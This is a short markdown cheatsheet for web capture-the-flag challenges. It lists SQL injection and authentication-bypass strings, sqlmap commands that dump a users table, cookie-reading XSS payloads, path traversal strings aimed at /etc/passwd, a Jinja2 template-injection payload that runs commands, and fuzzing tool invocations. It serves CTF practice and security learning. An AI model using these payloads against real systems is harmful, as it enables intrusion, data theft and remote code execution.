# 🌐 Web CTF Cheatsheet

---

## 💉 SQL Injection

### Basic Payloads
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Detection
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Authentication Bypass

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

```bash
# JWT decode
echo "eyJ..." | base64 -d

# Tools
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Useful Tools

```bash
# Directory bruteforce
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Parameter discovery
arjun -u http://url
```

---

## 📋 Web CTF Checklist

```markdown
□ Check source code (Ctrl+U)
□ Check robots.txt, sitemap.xml
□ Check cookies/JWT
□ Test SQLi on inputs
□ Test XSS on inputs
□ Test LFI on file parameters
□ Check for SSTI
□ Directory bruteforce
□ Check for exposed .git
```

---

**Back to CTF:** [🏁 CTF Overview](./README.md)
